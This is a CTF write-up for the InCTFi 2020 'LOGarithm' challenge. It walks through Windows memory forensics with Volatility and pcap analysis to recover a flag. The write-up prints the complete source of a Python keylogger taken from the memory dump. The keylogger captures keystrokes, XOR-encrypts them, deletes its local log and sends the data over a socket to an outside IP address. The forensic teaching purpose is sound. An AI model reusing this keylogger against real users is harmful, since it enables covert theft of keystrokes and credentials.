---
title: LOGarithm - InCTF Internationals/bi0s CTF 2020
categories: 
    - CTF-Writeups
tags: 
    - Windows Memory Analysis
    - bi0sCTF
author: Abhiram Kumar
date: 2020-08-05
draft: false
slug: inctfi-2020-logarithm
toc: true
---

Full solution to <b>LOGarithm</b> challenge from InCTFi 2020.

<!--more-->

**tl;dr**

+ Extract keylogger script from the memory dump.
+ Extract the master key from the packet capture.
+ Reverse the script to get the flag.

**Challenge points**: 100

**No. of solves**: 49

**Challenge Author**: [stuxn3t](https://twitter.com/_abhiramkumar)

## Challenge description

![description](/images/CTF/InCTFi/logarithm/description.png)

The challenge file can be downloaded from [Google drive](https://drive.google.com/file/d/13jqNNjlYjrcAaIdmq77sd2HkE6athVJg/view).

## Initial analysis

We are provided with 2 files. A memory dump and packet capture.

In this post, I will be first going through the memory dump in order to relate better with the traffic present in the packet capture.

### Finding the profile

```bash
$ volatility -f Evidence.vmem imageinfo
```

![imageinfo](/images/CTF/InCTFi/logarithm/imageinfo.png)

I'll be using **Win7SP1x64** as the profile for this challenge.

## Scanning active processes

Since we believe that some data was stolen sent to the adversary, it is good to assume that we might have a malicious process running. Let us check the active processes 
in the system to better understand the scenario.

```bash
$ volatility -f Evidence.vmem --profile=Win7SP1x64 pslist
```

![pslist](/images/CTF/InCTFi/logarithm/pslist.png)

We observer 2 very interesting processes **cmd.exe** & **python**.

## Listing the cmd history

Let us use the `cmdscan` plugin to check if any suspicious commands were executed.

```bash
$ volatility -f Evidence.vmem --profile=Win7SP1x64 cmdscan
```

![cmdscan](/images/CTF/InCTFi/logarithm/cmdscan.png)

Well, there is nothing much in it which can be of any use.

## Finding the keylogger

Now, we have to check what "file" was executed in python. Let us use the **cmdline** plugin to see what script was run.

```bash
$ volatility -f Evidence.vmem --profile=Win7SP1x64 cmdline -p 2216
```

![cmdline](/images/CTF/InCTFi/logarithm/cmdline.png)

So this was the file **C:\Users\Mike\Downloads\keylogger.py** that was executed.

### Extracting keylogger.py

We will use the **filescan** plugin to locate the offset of the file.

```bash
$ volatility -f Evidence.vmem --profile=Win7SP1x64 filescan | grep "keylogger.py"
```

![filescan](/images/CTF/InCTFi/logarithm/filescan.png)

So the offset is **0x000000003ee119b0**

Using the **dumpfiles** plugin, we dump the file.

## Reversing keylogger

This is the **keylogger.py** script that we extracted from memory.

```python
import socket, os
from pynput.keyboard import Key, Listener
import socket

import logging
list1 = []

def keylog():
    dir = r"C:\Users\Mike\Desktop\key.log"
    logging.basicConfig(filename=dir, level=logging.DEBUG,format='%(message)s')

    def on_press(key):
        a = str(key).replace("u'","").replace("'","")
        list1.append(a)

    def on_release(key):
        if str(key) == 'Key.esc':
            print "Data collection complete. Sending data to master"
            logging.info(' '.join(list1))
            logging.shutdown()
            master_encrypt()
        

    with Listener(
        on_press = on_press,
        on_release = on_release) as listener:
        listener.join()

def send_to_master(data):
    s = socket.socket()
    host = '18.140.60.203'
    port = 1337
    
    s.connect((host, port))
    key_log = data
    s.send(key_log)
    s.close()
    exit(1)

def master_encrypt():
    mkey = os.getenv('t3mp')
    f = open("C:/Users/Mike/Desktop/key.log","r")
    modified = ''.join(f.readlines()).replace("\n","")
    f.close()
    data = master_xor(mkey, modified).encode("base64")
    os.unlink("C:/Users/Mike/Desktop/key.log")
    send_to_master(data)

def master_xor(msg,mkey):
    l = len(mkey)
    xor_complete = ""

    for i in range(0, len(msg)):
        xor_complete += chr(ord(msg[i]) ^ ord(mkey[i % l]))
    
    return xor_complete

if __name__ == "__main__":
    keylog()
```

So from the script above we can see that, the script is **logging keystrokes** and **xor-ing** it with a malicious environmental variable **t3mp**. The **IP** of the attacker is also visible which in this case is **18.140.60.203** and the **port** is **1337**.

So we have to extract the encrypted text from the packet capture and also retrieve the value of the env **t3mp**.

## Extracting encrypted text & env

We use **Wireshark** to inspect the pcap file. Since we already know the IP and port, we can apply appropriate filters and extract the text.

![wireshark](/images/CTF/InCTFi/logarithm/wireshark.png)

The data is some base64 encoded text.

To extract malicious env, we use the **envars** plugin to get the variable's value.

![env](/images/CTF/InCTFi/logarithm/envars.png)

Now that we have everything we need, all we need to do is to xor them.

## Decryption

![solution](/images/CTF/InCTFi/logarithm/solution.png)

So in this way, we extract the flag.

## Flag

**FLAG**: inctf{n3v3r\_TrUs7\_Sp4m\_e\_m41Ls}
{:.success}

For further queries, please DM me on Twitter: <https://twitter.com/_abhiramkumar>.